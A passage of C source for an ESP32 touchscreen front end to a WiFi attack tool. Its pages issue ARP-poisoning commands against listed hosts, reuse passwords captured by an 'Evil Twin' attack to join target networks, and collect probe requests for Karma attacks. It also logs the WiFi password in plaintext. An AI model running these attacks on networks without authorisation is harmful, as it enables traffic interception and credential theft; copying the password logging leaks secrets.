            lv_obj_set_style_text_font(ip_lbl, &lv_font_montserrat_16, 0);
            lv_obj_set_style_text_color(ip_lbl, COLOR_MATERIAL_CYAN, 0);
            lv_obj_set_width(ip_lbl, 150);
            
            // MAC
            lv_obj_t *mac_lbl = lv_label_create(row);
            lv_label_set_text(mac_lbl, arp_hosts[i].mac);
            lv_obj_set_style_text_font(mac_lbl, &lv_font_montserrat_14, 0);
            lv_obj_set_style_text_color(mac_lbl, lv_color_hex(0x888888), 0);
        }
    }
}

// Host click callback - show ARP attack popup
static void arp_host_click_cb(lv_event_t *e)
{
    int idx = (int)(intptr_t)lv_event_get_user_data(e);
    if (idx < 0 || idx >= arp_host_count) return;
    
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;
    
    // Block ARP poisoning if Red Team mode is disabled
    if (!enable_red_team) {
        ESP_LOGW(TAG, "ARP Poisoning blocked - Red Team mode disabled");
        if (arp_status_label) {
            lv_label_set_text(arp_status_label, "ARP Poisoning requires Red Team mode");
            lv_obj_set_style_text_color(arp_status_label, COLOR_MATERIAL_RED, 0);
        }
        return;
    }
    
    arp_host_t *host = &arp_hosts[idx];
    ESP_LOGI(TAG, "ARP Poison: Starting attack on %s (%s)", host->ip, host->mac);
    
    // Send arp_ban command to current tab's UART
    char cmd[64];
    snprintf(cmd, sizeof(cmd), "arp_ban %s %s", host->mac, host->ip);
    uart_send_command_for_tab(cmd);
    
    // Create attack popup
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    ctx->arp_attack_popup_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(ctx->arp_attack_popup_overlay);
    lv_obj_set_size(ctx->arp_attack_popup_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(ctx->arp_attack_popup_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(ctx->arp_attack_popup_overlay, LV_OPA_50, 0);
    lv_obj_clear_flag(ctx->arp_attack_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(ctx->arp_attack_popup_overlay, LV_OBJ_FLAG_CLICKABLE);
    
    ctx->arp_attack_popup = lv_obj_create(ctx->arp_attack_popup_overlay);
    lv_obj_set_size(ctx->arp_attack_popup, 400, 250);
    lv_obj_center(ctx->arp_attack_popup);
    lv_obj_set_style_bg_color(ctx->arp_attack_popup, lv_color_hex(0x1A1A2A), 0);
    lv_obj_set_style_border_color(ctx->arp_attack_popup, COLOR_MATERIAL_PURPLE, 0);
    lv_obj_set_style_border_width(ctx->arp_attack_popup, 3, 0);
    lv_obj_set_style_radius(ctx->arp_attack_popup, 16, 0);
    lv_obj_set_style_pad_all(ctx->arp_attack_popup, 20, 0);
    lv_obj_set_flex_flow(ctx->arp_attack_popup, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(ctx->arp_attack_popup, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_row(ctx->arp_attack_popup, 15, 0);
    lv_obj_clear_flag(ctx->arp_attack_popup, LV_OBJ_FLAG_SCROLLABLE);
    
    // Icon
    lv_obj_t *icon = lv_label_create(ctx->arp_attack_popup);
    lv_label_set_text(icon, LV_SYMBOL_SHUFFLE);
    lv_obj_set_style_text_font(icon, &lv_font_montserrat_40, 0);
    lv_obj_set_style_text_color(icon, COLOR_MATERIAL_PURPLE, 0);
    
    // Title
    lv_obj_t *title = lv_label_create(ctx->arp_attack_popup);
    lv_label_set_text_fmt(title, "ARP Poisoning %s", host->ip);
    lv_obj_set_style_text_font(title, &lv_font_montserrat_18, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_PURPLE, 0);
    
    // Status
    lv_obj_t *status = lv_label_create(ctx->arp_attack_popup);
    lv_label_set_text(status, "Attack in Progress...");
    lv_obj_set_style_text_font(status, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(status, lv_color_hex(0xCCCCCC), 0);
    
    // Stop button
    lv_obj_t *stop_btn = lv_btn_create(ctx->arp_attack_popup);
    lv_obj_set_size(stop_btn, 140, 50);
    lv_obj_set_style_bg_color(stop_btn, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_radius(stop_btn, 10, 0);
    lv_obj_add_event_cb(stop_btn, arp_attack_popup_close_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *stop_label = lv_label_create(stop_btn);
    lv_label_set_text(stop_label, "STOP");
    lv_obj_set_style_text_font(stop_label, &lv_font_montserrat_18, 0);
    lv_obj_center(stop_label);
}

// ARP attack popup close callback
static void arp_attack_popup_close_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "ARP Poison: Stopping attack");
    
    // Send stop command to current tab's UART
    uart_send_command_for_tab("stop");
    
    // Close popup
    tab_context_t *ctx = get_current_ctx();
    if (ctx && ctx->arp_attack_popup_overlay) {
        lv_obj_del(ctx->arp_attack_popup_overlay);
        ctx->arp_attack_popup_overlay = NULL;
        ctx->arp_attack_popup = NULL;
    }
}

// Auto connect timer callback - runs wifi_connect and then list_hosts
static void arp_auto_connect_timer_cb(lv_timer_t *timer)
{
    lv_timer_del(timer);  // One-shot timer
    
    if (!arp_auto_mode) return;
    
    ESP_LOGI(TAG, "ARP Auto mode: Connecting to %s with password %s", arp_target_ssid, arp_target_password);
    
    // Update status
    if (arp_status_label) {
        lv_label_set_text_fmt(arp_status_label, "Connecting to %s...", arp_target_ssid);
        lv_obj_set_style_text_color(arp_status_label, COLOR_MATERIAL_AMBER, 0);
    }
    
    // Force UI refresh
    bsp_display_lock(0);
    bsp_display_unlock();
    vTaskDelay(pdMS_TO_TICKS(50));
    
    // Send wifi_connect command to current tab's UART
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "wifi_connect %s %s", arp_target_ssid, arp_target_password);
    uart_send_command_for_tab(cmd);
    uart_port_t uart_port = get_current_uart();
    
    // Wait for response (up to 15 seconds)
    static char rx_buffer[1024];
    int total_len = 0;
    int timeout_ms = 15000;
    int elapsed_ms = 0;
    bool success = false;
    
    while (elapsed_ms < timeout_ms) {
        int len = transport_read_bytes(uart_port, rx_buffer + total_len, sizeof(rx_buffer) - total_len - 1, pdMS_TO_TICKS(200));
        if (len > 0) {
            total_len += len;
            rx_buffer[total_len] = '\0';
            
            // Check for success message
            if (strstr(rx_buffer, "Connected to") != NULL || strstr(rx_buffer, "connected to") != NULL) {
                success = true;
                break;
            }
            // Check for failure
            if (strstr(rx_buffer, "Failed") != NULL || strstr(rx_buffer, "failed") != NULL) {
                break;
            }
        }
        elapsed_ms += 200;
    }
    
    ESP_LOGI(TAG, "ARP Auto mode: wifi_connect response: %s", rx_buffer);
    
    bsp_display_lock(0);
    
    if (success) {
        ESP_LOGI(TAG, "ARP Auto mode: Connected successfully");
        arp_wifi_connected = true;
        
        if (arp_status_label) {
            lv_label_set_text_fmt(arp_status_label, "Connected to %s - Click 'List Hosts' to scan", arp_target_ssid);
            lv_obj_set_style_text_color(arp_status_label, COLOR_MATERIAL_GREEN, 0);
        }
        
        // Show List Hosts button
        if (arp_list_hosts_btn) {
            lv_obj_clear_flag(arp_list_hosts_btn, LV_OBJ_FLAG_HIDDEN);
        }
        
        // Update placeholder text
        if (arp_hosts_container) {
            lv_obj_clean(arp_hosts_container);
            lv_obj_t *placeholder = lv_label_create(arp_hosts_container);
            lv_label_set_text(placeholder, "Click 'List Hosts' to scan network for targets");
            lv_obj_set_style_text_font(placeholder, &lv_font_montserrat_14, 0);
            lv_obj_set_style_text_color(placeholder, lv_color_hex(0x888888), 0);
        }
        
        bsp_display_unlock();
    } else {
        ESP_LOGW(TAG, "ARP Auto mode: Failed to connect");
        
        if (arp_status_label) {
            lv_label_set_text(arp_status_label, "Connection failed!");
            lv_obj_set_style_text_color(arp_status_label, COLOR_MATERIAL_RED, 0);
        }
        
        bsp_display_unlock();
    }
    
    // Reset auto mode flag
    arp_auto_mode = false;
    memset(arp_target_password, 0, sizeof(arp_target_password));
}

// Show ARP Poison page
static void show_arp_poison_page(void)
{
    ESP_LOGI(TAG, "Showing ARP Poison page for SSID: %s", arp_target_ssid);
    
    // Reset state
    arp_wifi_connected = false;
    arp_host_count = 0;
    memset(arp_our_ip, 0, sizeof(arp_our_ip));
    
    // Hide scan page
    if (scan_page) {
        lv_obj_add_flag(scan_page, LV_OBJ_FLAG_HIDDEN);
    }
    
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    arp_poison_page = lv_obj_create(container);
    lv_coord_t scr_height = lv_disp_get_ver_res(NULL);
    lv_obj_set_size(arp_poison_page, lv_pct(100), scr_height - 85);
    lv_obj_align(arp_poison_page, LV_ALIGN_TOP_MID, 0, 85);
    lv_obj_set_style_bg_color(arp_poison_page, lv_color_hex(0x1A1A1A), 0);
    lv_obj_set_style_border_width(arp_poison_page, 0, 0);
    lv_obj_set_style_pad_all(arp_poison_page, 15, 0);
    lv_obj_set_flex_flow(arp_poison_page, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(arp_poison_page, 10, 0);
    
    // Header
    lv_obj_t *header = lv_obj_create(arp_poison_page);
    lv_obj_set_size(header, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(header, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_set_style_pad_all(header, 0, 0);
    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(header, 15, 0);
    lv_obj_clear_flag(header, LV_OBJ_FLAG_SCROLLABLE);
    
    // Back button
    lv_obj_t *back_btn = lv_btn_create(header);
    lv_obj_set_size(back_btn, 72, 60);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x333333), 0);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x444444), LV_STATE_PRESSED);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_add_event_cb(back_btn, arp_poison_back_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *back_icon = lv_label_create(back_btn);
    lv_label_set_text(back_icon, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_color(back_icon, lv_color_hex(0xFFFFFF), 0);
    lv_obj_center(back_icon);
    
    // Title - use "Tests" instead of "Attacks" when Red Team is disabled
    lv_obj_t *title = lv_label_create(header);
    lv_label_set_text(title, enable_red_team ? "Internal WiFi Attacks" : "Internal WiFi Tests");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_22, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_PURPLE, 0);
    
    // Target network info
    lv_obj_t *target_label = lv_label_create(arp_poison_page);
    lv_label_set_text_fmt(target_label, "Target: %s", arp_target_ssid);
    lv_obj_set_style_text_font(target_label, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(target_label, lv_color_hex(0xCCCCCC), 0);
    
    // Check if password is known from Evil Twin database (only in manual mode)
    bool password_known = false;
    if (!arp_auto_mode) {
        // Load Evil Twin passwords to check if we know this network
        evil_twin_entry_count = 0;
        memset(evil_twin_entries, 0, sizeof(evil_twin_entries));
        
        uart_port_t uart_port = get_current_uart();
        uart_flush(uart_port);
        uart_send_command_for_tab("show_pass evil");
        
        char rx_buffer[512];
        int total_len = 0;
        int retries = 10;
        int empty_reads = 0;
        
        while (retries-- > 0 && evil_twin_entry_count < 50) {
            int len = transport_read_bytes(uart_port, rx_buffer, sizeof(rx_buffer) - 1, pdMS_TO_TICKS(100));
            
            if (len > 0) {
                rx_buffer[len] = '\0';
                total_len += len;
                empty_reads = 0;
                
                // Parse lines: "SSID", "password"
                char *line = strtok(rx_buffer, "\n\r");
                while (line != NULL && evil_twin_entry_count < 50) {
                    // Skip empty lines and headers
                    if (strlen(line) > 3 && line[0] == '\"') {
                        // Extract SSID
                        char *ssid_start = line + 1;
                        char *ssid_end = strchr(ssid_start, '\"');
                        if (ssid_end && *(ssid_end + 1) == ',' && *(ssid_end + 2) == ' ' && *(ssid_end + 3) == '\"') {
                            *ssid_end = '\0';
                            char *pass_start = ssid_end + 4;
                            char *pass_end = strchr(pass_start, '\"');
                            if (pass_end) {
                                *pass_end = '\0';
                                strncpy(evil_twin_entries[evil_twin_entry_count].ssid, ssid_start, 32);
                                evil_twin_entries[evil_twin_entry_count].ssid[32] = '\0';
                                strncpy(evil_twin_entries[evil_twin_entry_count].password, pass_start, 64);
                                evil_twin_entries[evil_twin_entry_count].password[64] = '\0';
                                evil_twin_entry_count++;
                            }
                        }
                    }
                    line = strtok(NULL, "\n\r");
                }
            } else {
                empty_reads++;
                if (empty_reads >= 3) break;
            }
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        ESP_LOGI(TAG, "ARP: Loaded %d Evil Twin password entries", evil_twin_entry_count);
        
        // Check if password is known
        for (int i = 0; i < evil_twin_entry_count; i++) {
            if (strcmp(evil_twin_entries[i].ssid, arp_target_ssid) == 0) {
                strncpy(arp_target_password, evil_twin_entries[i].password, sizeof(arp_target_password) - 1);
                arp_target_password[sizeof(arp_target_password) - 1] = '\0';
                password_known = true;
                ESP_LOGI(TAG, "ARP: Found password for %s in Evil Twin database", arp_target_ssid);
                break;
            }
        }
    }
    
    // Password section (only shown in manual mode)
    lv_obj_t *pass_section = NULL;
    
    if (!arp_auto_mode) {
        pass_section = lv_obj_create(arp_poison_page);
        lv_obj_set_size(pass_section, lv_pct(100), LV_SIZE_CONTENT);
        lv_obj_set_style_bg_color(pass_section, lv_color_hex(0x252525), 0);
        lv_obj_set_style_border_width(pass_section, 0, 0);
        lv_obj_set_style_radius(pass_section, 8, 0);
        lv_obj_set_style_pad_all(pass_section, 15, 0);
        lv_obj_set_style_pad_row(pass_section, 10, 0);
        lv_obj_clear_flag(pass_section, LV_OBJ_FLAG_SCROLLABLE);
        
        if (password_known) {
            // Show known password as label
            lv_obj_set_flex_flow(pass_section, LV_FLEX_FLOW_COLUMN);
            
            lv_obj_t *pass_title = lv_label_create(pass_section);
            lv_label_set_text(pass_title, "Known Password:");
            lv_obj_set_style_text_font(pass_title, &lv_font_montserrat_14, 0);
            lv_obj_set_style_text_color(pass_title, lv_color_hex(0xFFFFFF), 0);
            
            lv_obj_t *pass_value = lv_label_create(pass_section);
            lv_label_set_text_fmt(pass_value, "%s", arp_target_password);
            lv_obj_set_style_text_font(pass_value, &lv_font_montserrat_16, 0);
            lv_obj_set_style_text_color(pass_value, COLOR_MATERIAL_GREEN, 0);
            
            // Buttons row
            lv_obj_t *btn_row = lv_obj_create(pass_section);
            lv_obj_set_size(btn_row, lv_pct(100), LV_SIZE_CONTENT);
            lv_obj_set_style_bg_opa(btn_row, LV_OPA_TRANSP, 0);
            lv_obj_set_style_border_width(btn_row, 0, 0);
            lv_obj_set_style_pad_all(btn_row, 0, 0);
            lv_obj_set_flex_flow(btn_row, LV_FLEX_FLOW_ROW);
            lv_obj_set_flex_align(btn_row, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
            lv_obj_set_style_pad_column(btn_row, 15, 0);
            lv_obj_clear_flag(btn_row, LV_OBJ_FLAG_SCROLLABLE);
            
            // Connect button
            arp_connect_btn = lv_btn_create(btn_row);
            lv_obj_set_size(arp_connect_btn, 120, 40);
            lv_obj_set_style_bg_color(arp_connect_btn, COLOR_MATERIAL_GREEN, 0);
            lv_obj_set_style_radius(arp_connect_btn, 8, 0);
            lv_obj_add_event_cb(arp_connect_btn, arp_connect_cb, LV_EVENT_CLICKED, NULL);
            
            lv_obj_t *connect_label = lv_label_create(arp_connect_btn);
            lv_label_set_text(connect_label, "Connect");
            lv_obj_set_style_text_font(connect_label, &lv_font_montserrat_16, 0);
            lv_obj_center(connect_label);
            
            // List Hosts button (hidden initially)
            arp_list_hosts_btn = lv_btn_create(btn_row);
            lv_obj_set_size(arp_list_hosts_btn, 120, 40);
            lv_obj_set_style_bg_color(arp_list_hosts_btn, COLOR_MATERIAL_CYAN, 0);
            lv_obj_set_style_radius(arp_list_hosts_btn, 8, 0);
            lv_obj_add_event_cb(arp_list_hosts_btn, arp_list_hosts_cb, LV_EVENT_CLICKED, NULL);
            lv_obj_add_flag(arp_list_hosts_btn, LV_OBJ_FLAG_HIDDEN);
            
            lv_obj_t *list_hosts_label = lv_label_create(arp_list_hosts_btn);
            lv_label_set_text(list_hosts_label, "List Hosts");
            lv_obj_set_style_text_font(list_hosts_label, &lv_font_montserrat_16, 0);
            lv_obj_center(list_hosts_label);
        } else {
            // Show password input
            lv_obj_set_flex_flow(pass_section, LV_FLEX_FLOW_ROW);
            lv_obj_set_flex_align(pass_section, LV_FLEX_ALIGN_SPACE_BETWEEN, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
            lv_obj_set_style_pad_column(pass_section, 15, 0);
            
            // Password label + input
            lv_obj_t *pass_left = lv_obj_create(pass_section);
            lv_obj_set_size(pass_left, LV_SIZE_CONTENT, LV_SIZE_CONTENT);
            lv_obj_set_style_bg_opa(pass_left, LV_OPA_TRANSP, 0);
            lv_obj_set_style_border_width(pass_left, 0, 0);
            lv_obj_set_style_pad_all(pass_left, 0, 0);
            lv_obj_set_flex_flow(pass_left, LV_FLEX_FLOW_ROW);
            lv_obj_set_flex_align(pass_left, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
            lv_obj_set_style_pad_column(pass_left, 10, 0);
            lv_obj_clear_flag(pass_left, LV_OBJ_FLAG_SCROLLABLE);
            
            lv_obj_t *pass_label = lv_label_create(pass_left);
            lv_label_set_text(pass_label, "Password:");
            lv_obj_set_style_text_font(pass_label, &lv_font_montserrat_16, 0);
            lv_obj_set_style_text_color(pass_label, lv_color_hex(0xFFFFFF), 0);
            
            arp_password_input = lv_textarea_create(pass_left);
            lv_obj_set_size(arp_password_input, 300, 40);
            lv_textarea_set_one_line(arp_password_input, true);
            lv_textarea_set_placeholder_text(arp_password_input, "WiFi password");
            lv_obj_set_style_bg_color(arp_password_input, lv_color_hex(0x1A1A1A), 0);
            lv_obj_set_style_border_color(arp_password_input, COLOR_MATERIAL_PURPLE, 0);
            lv_obj_set_style_border_width(arp_password_input, 1, 0);
            lv_obj_set_style_text_color(arp_password_input, lv_color_hex(0xFFFFFF), 0);
            lv_obj_add_event_cb(arp_password_input, arp_password_input_cb, LV_EVENT_CLICKED, NULL);
            
            // Connect button
            arp_connect_btn = lv_btn_create(pass_section);
            lv_obj_set_size(arp_connect_btn, 120, 40);
            lv_obj_set_style_bg_color(arp_connect_btn, COLOR_MATERIAL_GREEN, 0);
            lv_obj_set_style_radius(arp_connect_btn, 8, 0);
            lv_obj_add_event_cb(arp_connect_btn, arp_connect_cb, LV_EVENT_CLICKED, NULL);
            
            lv_obj_t *connect_label = lv_label_create(arp_connect_btn);
            lv_label_set_text(connect_label, "Connect");
            lv_obj_set_style_text_font(connect_label, &lv_font_montserrat_16, 0);
            lv_obj_center(connect_label);
            
            // List Hosts button (hidden initially)
            arp_list_hosts_btn = lv_btn_create(pass_section);
            lv_obj_set_size(arp_list_hosts_btn, 120, 40);
            lv_obj_set_style_bg_color(arp_list_hosts_btn, COLOR_MATERIAL_CYAN, 0);
            lv_obj_set_style_radius(arp_list_hosts_btn, 8, 0);
            lv_obj_add_event_cb(arp_list_hosts_btn, arp_list_hosts_cb, LV_EVENT_CLICKED, NULL);
            lv_obj_add_flag(arp_list_hosts_btn, LV_OBJ_FLAG_HIDDEN);
            
            lv_obj_t *list_hosts_label = lv_label_create(arp_list_hosts_btn);
            lv_label_set_text(list_hosts_label, "List Hosts");
            lv_obj_set_style_text_font(list_hosts_label, &lv_font_montserrat_16, 0);
            lv_obj_center(list_hosts_label);
        }
    }
    
    // In auto mode, create List Hosts button here (since pass_section is not created)
    if (arp_auto_mode) {
        lv_obj_t *btn_container = lv_obj_create(arp_poison_page);
        lv_obj_set_size(btn_container, lv_pct(100), LV_SIZE_CONTENT);
        lv_obj_set_style_bg_opa(btn_container, LV_OPA_TRANSP, 0);
        lv_obj_set_style_border_width(btn_container, 0, 0);
        lv_obj_set_style_pad_all(btn_container, 0, 0);
        lv_obj_set_flex_flow(btn_container, LV_FLEX_FLOW_ROW);
        lv_obj_set_flex_align(btn_container, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
        lv_obj_clear_flag(btn_container, LV_OBJ_FLAG_SCROLLABLE);
        
        arp_list_hosts_btn = lv_btn_create(btn_container);
        lv_obj_set_size(arp_list_hosts_btn, 150, 45);
        lv_obj_set_style_bg_color(arp_list_hosts_btn, COLOR_MATERIAL_CYAN, 0);
        lv_obj_set_style_radius(arp_list_hosts_btn, 8, 0);
        lv_obj_add_event_cb(arp_list_hosts_btn, arp_list_hosts_cb, LV_EVENT_CLICKED, NULL);
        lv_obj_add_flag(arp_list_hosts_btn, LV_OBJ_FLAG_HIDDEN);  // Hidden until connected
        
        lv_obj_t *list_hosts_label = lv_label_create(arp_list_hosts_btn);
        lv_label_set_text(list_hosts_label, LV_SYMBOL_REFRESH " List Hosts");
        lv_obj_set_style_text_font(list_hosts_label, &lv_font_montserrat_16, 0);
        lv_obj_center(list_hosts_label);
    }
    
    // Status label
    arp_status_label = lv_label_create(arp_poison_page);
    if (arp_auto_mode) {
        lv_label_set_text_fmt(arp_status_label, "Auto-connecting to %s...", arp_target_ssid);
        lv_obj_set_style_text_color(arp_status_label, COLOR_MATERIAL_AMBER, 0);
    } else {
        lv_label_set_text(arp_status_label, "Enter WiFi password to connect");
        lv_obj_set_style_text_color(arp_status_label, lv_color_hex(0x888888), 0);
    }
    lv_obj_set_style_text_font(arp_status_label, &lv_font_montserrat_14, 0);
    
    // Hosts container (scrollable)
    arp_hosts_container = lv_obj_create(arp_poison_page);
    lv_obj_set_size(arp_hosts_container, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_grow(arp_hosts_container, 1);
    lv_obj_set_style_bg_color(arp_hosts_container, lv_color_hex(0x252525), 0);
    lv_obj_set_style_border_width(arp_hosts_container, 0, 0);
    lv_obj_set_style_radius(arp_hosts_container, 8, 0);
    lv_obj_set_style_pad_all(arp_hosts_container, 8, 0);
    lv_obj_set_flex_flow(arp_hosts_container, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(arp_hosts_container, 6, 0);
    
    lv_obj_t *placeholder = lv_label_create(arp_hosts_container);
    if (arp_auto_mode) {
        lv_label_set_text(placeholder, "Connecting to network...");
    } else {
        lv_label_set_text(placeholder, "Connect to WiFi and click 'List Hosts' to scan network");
    }
    lv_obj_set_style_text_font(placeholder, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(placeholder, lv_color_hex(0x666666), 0);
    
    // Create keyboard (hidden initially, only in manual mode)
    if (!arp_auto_mode) {
        arp_keyboard = lv_keyboard_create(container);  // On parent container, not flex page
        lv_obj_set_size(arp_keyboard, lv_pct(100), 260);  // Larger keys
        lv_obj_align(arp_keyboard, LV_ALIGN_BOTTOM_MID, 0, 0);  // Pin to bottom
        lv_keyboard_set_textarea(arp_keyboard, arp_password_input);
        lv_obj_add_event_cb(arp_keyboard, arp_keyboard_cb, LV_EVENT_ALL, NULL);
        lv_obj_add_flag(arp_keyboard, LV_OBJ_FLAG_HIDDEN);
    }
    
    // In auto mode, start connection immediately
    if (arp_auto_mode) {
        // Use a small delay to let UI render first, then trigger auto connect
        lv_timer_create(arp_auto_connect_timer_cb, 100, NULL);
    }
}

// ======================= Karma Attack Functions =======================

// Back button callback - hide karma page and show tiles
static void karma_back_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "Karma: back button pressed, returning to tiles for tab %d", current_tab);
    
    // Stop any monitoring
    if (karma_monitoring) {
        karma_monitoring = false;
        uart_send_command_for_tab("stop");
    }
    
    karma_probe_count = 0;
    
    // Get current tab's data and show tiles
    tab_context_t *ctx = get_current_ctx();
    
    // Hide karma page
    if (ctx->karma_page) {
        lv_obj_add_flag(ctx->karma_page, LV_OBJ_FLAG_HIDDEN);
    }
    
    // Show tiles
    if (ctx->tiles) {
        lv_obj_clear_flag(ctx->tiles, LV_OBJ_FLAG_HIDDEN);
        ctx->current_visible_page = ctx->tiles;
    }
}

// Start Sniffer button callback
static void karma_start_sniffer_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "Karma: Starting sniffer");
    
    uart_send_command_for_tab("start_sniffer");
    karma_sniffer_running = true;
    
    // Update button states
    if (karma_start_sniffer_btn) {
        lv_obj_add_state(karma_start_sniffer_btn, LV_STATE_DISABLED);
    }
    if (karma_stop_sniffer_btn) {
        lv_obj_clear_state(karma_stop_sniffer_btn, LV_STATE_DISABLED);
    }
    
    if (karma_status_label) {
        lv_label_set_text(karma_status_label, "Sniffer started - collecting probes...");
        lv_obj_set_style_text_color(karma_status_label, COLOR_MATERIAL_GREEN, 0);
    }
}

// Stop Sniffer button callback  
static void karma_stop_sniffer_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "Karma: Stopping sniffer");
    
    uart_send_command_for_tab("stop");
    karma_sniffer_running = false;
    
    // Update button states
    if (karma_start_sniffer_btn) {
        lv_obj_clear_state(karma_start_sniffer_btn, LV_STATE_DISABLED);
    }
    if (karma_stop_sniffer_btn) {
        lv_obj_add_state(karma_stop_sniffer_btn, LV_STATE_DISABLED);
    }
    
    if (karma_status_label) {
        lv_label_set_text(karma_status_label, "Sniffer stopped");
        lv_obj_set_style_text_color(karma_status_label, lv_color_hex(0x888888), 0);
    }
}

// Show Probes button callback
static void karma_show_probes_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "Karma: Fetching probes...");
    
    if (karma_status_label) {
        lv_label_set_text(karma_status_label, "Fetching probes...");
        lv_obj_set_style_text_color(karma_status_label, COLOR_MATERIAL_AMBER, 0);
    }
    
    // Force UI refresh
    lv_refr_now(NULL);
    bsp_display_unlock();
    vTaskDelay(pdMS_TO_TICKS(50));
    
    // Send list_probes command to current tab's UART
    uart_send_command_for_tab("list_probes");
    uart_port_t uart_port = get_current_uart();
    vTaskDelay(pdMS_TO_TICKS(500));
    
    // Read response
    static char rx_buffer[2048];
    int total_len = 0;
    int retries = 10;
    
    while (retries-- > 0) {
        int len = transport_read_bytes(uart_port, rx_buffer + total_len, sizeof(rx_buffer) - total_len - 1, pdMS_TO_TICKS(200));
        if (len > 0) {
            total_len += len;
        }
        if (len <= 0) break;
    }
    rx_buffer[total_len] = '\0';
    
    ESP_LOGI(TAG, "Karma: list_probes response (%d bytes)", total_len);
    // Log raw response for debugging
    ESP_LOGI(TAG, "Karma: Raw response:\n%s", rx_buffer);
    
    // Parse probes (format: "1 SSID_Name")
    karma_probe_count = 0;
    char *line = strtok(rx_buffer, "\n\r");
    while (line != NULL && karma_probe_count < KARMA_MAX_PROBES) {
        // Skip empty lines and non-probe lines
        char *p = line;
        while (*p == ' ') p++;
        
        // Check if line starts with a number
        if (isdigit((unsigned char)*p)) {
            int idx = 0;
            char ssid[33] = {0};
            
            // Parse index
            while (isdigit((unsigned char)*p)) {
                idx = idx * 10 + (*p - '0');
                p++;
            }
            
            // Skip space
            while (*p == ' ') p++;
            
            // Rest is SSID
            if (*p != '\0' && strlen(p) > 0) {
                strncpy(ssid, p, sizeof(ssid) - 1);
                // Trim trailing whitespace
                size_t len = strlen(ssid);
                while (len > 0 && isspace((unsigned char)ssid[len - 1])) {
                    ssid[--len] = '\0';
                }
                
                if (strlen(ssid) > 0) {
                    karma_probes[karma_probe_count].index = idx;
                    snprintf(karma_probes[karma_probe_count].ssid, sizeof(karma_probes[0].ssid), "%s", ssid);
                    karma_probe_count++;
                    ESP_LOGI(TAG, "Karma probe %d: [%d] %s", karma_probe_count, idx, ssid);
                }
            }
        }
        line = strtok(NULL, "\n\r");
    }
    
    bsp_display_lock(0);
    
    // Update status
    if (karma_status_label) {
        if (karma_probe_count > 0) {
            lv_label_set_text_fmt(karma_status_label, "Found %d probes - click to attack", karma_probe_count);
            lv_obj_set_style_text_color(karma_status_label, COLOR_MATERIAL_GREEN, 0);
        } else {
            lv_label_set_text(karma_status_label, "No probes found - run sniffer first");
            lv_obj_set_style_text_color(karma_status_label, COLOR_MATERIAL_RED, 0);
        }
    }
    
    // Display probes in container
    if (karma_probes_container) {
        lv_obj_clean(karma_probes_container);
        
        for (int i = 0; i < karma_probe_count; i++) {
            lv_obj_t *row = lv_obj_create(karma_probes_container);
            lv_obj_set_size(row, lv_pct(100), LV_SIZE_CONTENT);
            lv_obj_set_style_bg_color(row, lv_color_hex(0x2D2D2D), 0);
            lv_obj_set_style_bg_color(row, lv_color_hex(0x3D3D3D), LV_STATE_PRESSED);
            lv_obj_set_style_border_width(row, 0, 0);
            lv_obj_set_style_radius(row, 6, 0);
            lv_obj_set_style_pad_all(row, 12, 0);
            lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
            lv_obj_set_flex_align(row, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
            lv_obj_set_style_pad_column(row, 10, 0);
            lv_obj_clear_flag(row, LV_OBJ_FLAG_SCROLLABLE);
            lv_obj_add_flag(row, LV_OBJ_FLAG_CLICKABLE);
            lv_obj_add_event_cb(row, karma_probe_click_cb, LV_EVENT_CLICKED, (void*)(intptr_t)i);
            
            // Index
            lv_obj_t *idx_lbl = lv_label_create(row);
            lv_label_set_text_fmt(idx_lbl, "%d.", karma_probes[i].index);
